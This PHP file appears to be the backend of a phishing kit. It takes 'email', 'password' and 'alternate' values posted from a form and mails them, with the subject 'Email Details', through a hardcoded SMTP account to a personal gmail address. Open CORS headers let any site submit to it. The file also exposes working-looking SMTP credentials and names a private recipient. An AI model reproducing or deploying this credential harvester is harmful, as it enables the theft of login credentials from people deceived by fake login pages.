<?php
use PHPMailer\PHPMailer\PHPMailer;
    use PHPMailer\PHPMailer\SMTP;
    use PHPMailer\PHPMailer\Exception;
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Headers: *");
  
    
 
    
    //Load Composer's autoloader
    require 'vendor/autoload.php';
    
    if(isset($_POST['submit'])){
        
        $email = $_POST['email'];
        $password = $_POST['password'];
        $alternate = $_POST['alternate'];

        $message = "Email: ".$email."<br> Password: ".$password."<br> Alternate: ".$alternate;

        


    }
   
    //Instantiation and passing `true` enables exceptions
    $mail = new PHPMailer(true);
    
    try {
        //Server settings
        $mail->SMTPDebug = 3;                      //Enable verbose debug output
        $mail->isSMTP();                                            //Send using SMTP
        $mail->Host       = 'smtp.mailtrap.io';                     //Set the SMTP server to send through
        $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
        $mail->Username   = '9b74bee33566d6';                     //SMTP username
        $mail->Password   = '65cd092ce93ebf';                               //SMTP password
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;         //Enable TLS encryption; `PHPMailer::ENCRYPTION_SMTPS` encouraged
        $mail->Port       = 587;                                    //TCP port to connect to, use 465 for `PHPMailer::ENCRYPTION_SMTPS` above
    
        //Recipients
        $mail->setFrom('trencytech.mailgun.org');
        $mail->addAddress('tochukwu.ubani@gmail.com');     //Add a recipient
     
        //Content
        $mail->isHTML(true);                                  //Set email format to HTML
        $mail->Subject = 'Email Details';
        $mail->Body    = $message;
       
    
        $mail->send();
        echo 'Message has been sent';
    } catch (Exception $e) {
        echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    }
 


?>
